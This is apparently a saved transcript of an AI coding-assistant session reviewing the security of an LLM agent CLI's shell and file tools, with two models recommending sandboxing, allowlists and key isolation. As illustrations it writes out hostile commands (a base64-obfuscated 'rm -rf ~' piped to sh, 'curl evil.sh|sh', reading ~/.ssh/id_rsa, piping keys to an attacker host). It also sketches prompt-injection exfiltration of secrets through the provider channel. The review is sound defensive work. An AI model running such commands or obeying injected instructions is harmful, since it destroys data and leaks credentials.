@@ -1,1 +1,269 @@
-we need a "secure from the ground up" approach to prevent security issues that come with running tools with llm generated args. shell exec too is the most obvious but maybe theres other surfaces. whats the standard way of achieving this? simple user confirmation isn't enough. we have to have a situation where even the most grievous human error cannot mess up my pc or do anything unwanted. what we first need is a 
+
+❯ we need a "secure from the ground up" approach to prevent
+
+  security issues that come with running tools with llm generated
+
+  args. shell exec too is the most obvious but maybe theres
+
+  other surfaces. whats the standard way of achieving this?
+
+  simple user confirmation isn't enough. we have to have a
+
+  situation where even the most grievous human error cannot mess
+
+  up my pc or do anything unwanted. thoughts?
+
+
+ I've now seen your actual execution surface. Here's the honest
+
+  assessment and the standard answer.
+
+
+  Your current posture
+
+
+  File tools are actually well-confined.
+
+  resolveExistingProjectPath / resolveWritableProjectPath use
+
+  realpath to resolve symlinks and reject anything that escapes
+
+  projectRoot, plus they block absolute paths. That's the right
+
+  model: a hard boundary the model's arguments can't argue their
+
+  way past.
+
+
+  shell_exec undoes all of it, and the guards are theater:
+
+
+  1. DESTRUCTIVE_PATTERNS is a denylist, and denylists for command
+
+  strings are fundamentally defeatable. echo cm0gLXJmIH4=|base64
+
+  -d|sh, python -c "import shutil...", node -e "...", find .
+
+  -delete, > ~/.bashrc, curl evil.sh|sh, git config a malicious
+
+  hook — none match your regexes. You cannot enumerate badness.
+
+  2. confirmDestructive is self-attested by the model — the same
+
+  LLM both judges destructiveness and sets the "user confirmed"     flag. That's not a boundary; it's a variable the untrusted party
+
+  controls.
+
+  3. exec() invokes /bin/sh -c, so every command gets full shell
+
+  metacharacter interpretation, and cwd: projectRoot constrains     nothing — cat ~/.ssh/id_rsa, rm -rf ~, network exfiltration all
+
+  run fine.
+
+
+  So your instinct is correct: confirmation and pattern-matching
+
+  are not enough.
+
+
+  The standard answer: the boundary must be OS-enforced and
+
+  outside the model's reach
+
+
+  The principle that gives you "even the most grievous error can't
+
+  touch my PC": the enforcement has to live somewhere the LLM and
+
+  the tool code cannot influence — the kernel or a container
+
+  runtime — and it must make bad actions impossible, not detected.
+
+  Everything the model can wordsmith around (regexes) or set
+
+  (flags) is UX, not security.
+
+
+  This is exactly what Claude Code's own sandbox, Codex, and Devin
+
+  do: run the agent in an ephemeral sandbox and let the blast
+
+  radius be the sandbox.
+
+
+  Layers, from load-bearing to nice-to-have:
+
+
+  1. Isolation boundary (the actual guarantee). Run the agent — or
+
+  at minimum the exec surface — inside a container/VM:
+
+  - Cross-platform, pragmatic: a Docker/Podman devcontainer.
+
+  Bind-mount only the project dir, nothing else of the host exists
+
+  inside.
+
+  - Native Linux: bubblewrap (bwrap, unprivileged namespaces) or
+
+  Landlock (kernel 5.13+) to irrevocably drop the process's own
+
+  filesystem access to a path allowlist; seccomp-bpf to restrict
+
+  syscalls.
+
+Windows: AppContainer
+
+  / Windows Sandbox / job objects.
+
+  - Containers are attractive precisely because they give you one
+
+  abstraction across your Windows+Linux targets instead of three
+
+  native sandbox APIs.
+
+
+  2. Filesystem confinement. Project mounted read-write;
+
+  everything else invisible or read-only. This is what your file
+
+  tools already approximate in userspace — the sandbox makes it
+
+  kernel-enforced and extends it to shell_exec for free.
+
+
+  3. Network egress default-deny + host allowlist (provider APIs,
+
+  npm registry). This is what kills the exfiltration class (curl
+
+  ~/.ssh | attacker), which no command denylist can.
+
+
+  4. Resource limits (cgroups): CPU/memory/PID caps and disk
+
+  quota. This is the only thing that stops fork bombs, yes > file
+
+  disk fills, and runaway processes — your timeout_ms doesn't.
+
+
+  5. Defense-in-depth inside the box: replace the denylist with an
+
+  allowlist (git, npm, node, tsc…), and use execFile/spawn with
+
+  an argv array and shell:false for structured calls so there's no
+
+  shell to inject into at all. Keep confirmation prompts — but as
+
+  friction-reduction/mistake-catching UX, explicitly not as the
+
+  safety boundary.
+
+
+  What I'd do for freecode specifically
+
+
+  Two-boundary model:
+
+  - Outer (hard): ship/run inside a devcontainer or wrap
+
+  shell_exec (and ideally the whole process) in
+
+  bubblewrap/Seatbelt. This is the non-negotiable part that makes
+
+  your requirement true.
+
+  - Inner (soft): keep confirmation as UX, swap the
+
+  destructive-regex for a command allowlist, drop to spawn(...,
+
+  {shell:false}) where you don't need a shell. Delete
+
+  confirmDestructive self-attestation — it reads as protection but  isn't.
+
+
+  One thing to flag even under confinement: your file tools let
+
+  the model write into the project's own .git/hooks/, package.json
+
+  scripts, Makefile, etc., which then execute later outside a
+
+  prompt. "Inside project root" is necessary but a
+
+  deferred-execution surface — another reason the real boundary
+
+  needs to be the sandbox, not the write path.
+
+
+  Want me to sketch a concrete implementation? The
+
+  highest-leverage first step is a bubblewrap wrapper for
+
+  shell_exec on Linux (your npm test platform) plus a devcontainer
+
+  for the cross-platform story — I can prototype either. I'd
+
+  suggest we scope it in plan mode before touching code.
+
+
+❯ /model
+
+  ⎿  Set model to Fable 5 and saved as your default for new
+
+     sessions
+
+
+❯ hello fable. i want your judgement on this, is there anything
+
+  that opus missed?
+
+
+
+Opus's core architecture answer is right and I won't relitigate it: OS-enforced sandbox as the real boundary, allowlist over denylist, confirmation as UX not security. But I checked the code it didn't look at, and there are four real gaps — two of them verified bugs in the approval path itself.
+
+
+## 1. The approval UI is itself an attack surface (verified, not hypothetical)
+
+
+Opus said "keep confirmation as UX" without checking whether the confirmation shows the truth. It doesn't, three ways:
+
+
+- **Truncation:** the approval header is `header.slice(0, w - 1)` — one terminal line (`tool-approval.ts:52`). A shell command longer than ~79 chars gets its tail silently cut. `echo "reformatting transcript-renderer imports per lint config" && curl evil.sh|sh` — you approve the part you can see.
+
+- **No control-char sanitization:** `formatArgs` (`transcript-renderer.ts:26`) passes model-controlled strings raw to the terminal. A command containing `\r` or ANSI escapes can repaint/overwrite what's displayed before you approve it. Terminal-escape spoofing of approval prompts is a known real attack class — and notable given this repo *just* built a text-encoding layer for control-byte bugs (`src/util/text-encoding.ts`); display sanitization belongs there.
+
+- **Blind write approvals:** `filterArgs` for `create`/`edit` shows **path only** (`transcript-renderer.ts:39-40`). Content is rendered as a diff only *after* execution. So approving `create(.git/hooks/pre-commit)` never shows you what's going into it — which is exactly Opus's deferred-execution scenario, except the approval flow is structurally incapable of catching it.
+
+
+Even with a sandbox, approval integrity matters because approvals are what let effects *out* of the sandbox (commits, pushes).
+
+
+## 2. Key custody: the sandbox recommendation has a hole in it
+
+
+Opus said "run the agent — or at minimum the exec surface — inside a container." Those two options are not equivalent, and the difference is your API keys. freecode is a provider-routing CLI; its keys live in the process env, and `shell.ts:41` `execAsync` **inherits the full parent env** — today, any approved command can run `env` and read every provider key. If you follow the "sandbox the whole process" option, the keys move *inside* the boundary with the untrusted code.
+
+
+The ground-up architecture (what Claude Code's sandboxing and Codex actually do) is a **broker split**: a privileged host process holds keys, talks to providers, renders the approval UI; an unprivileged sandboxed executor runs tools; RPC between them. Secrets never enter the sandbox. Short of that split, at minimum pass a scrubbed env to `exec`.
+
+
+## 3. The threat model is prompt injection, not "grievous human error"
+
+
+You framed it as protecting against your own mistakes; Opus answered in that frame. The stronger adversary is **untrusted content**: a cloned repo's README, a downloaded eval dataset, a recorded scenario file — anything the `read`/`grep` tools pull into context can carry instructions the model then follows. Two consequences Opus missed:
+
+
+- **Read-only mode is not safe mode.** `read`+`grep`+network can exfiltrate `.env` contents *through the provider channel itself* — the model reads a secret and an injected instruction has it embed the secret in a commit message, URL, or its next API call. A perfect egress allowlist (provider API only) does not stop this. The only fix is secrets never being readable inside the boundary at all.
+
+- Your eval/scenario machinery routinely feeds external files to models, so this isn't theoretical for freecode specifically.
+
+
+## 4. Process lifetime escapes
+
+
+`exec`'s `timeout` SIGTERMs the shell; backgrounded grandchildren (`nohup x &`) survive it and outlive the session entirely. The container/PID-namespace fixes this for free — but if you do an incremental hardening pass first, you need `detached: true` + `process.kill(-pid)` process-group semantics, or the timeout is decorative.
+
+
+## Verdict
+
+
+Opus's plan is the right skeleton. I'd amend it: **broker architecture with keys outside the sandbox** is the "ground up" piece, not an optional refinement — and the approval-path fixes (full-content display, sanitization, no truncation) are cheap, self-contained, and worth doing *first* since they're live bugs regardless of when the sandbox lands. Want me to take the approval-path hardening as a concrete change now, or plan the broker/sandbox architecture first?
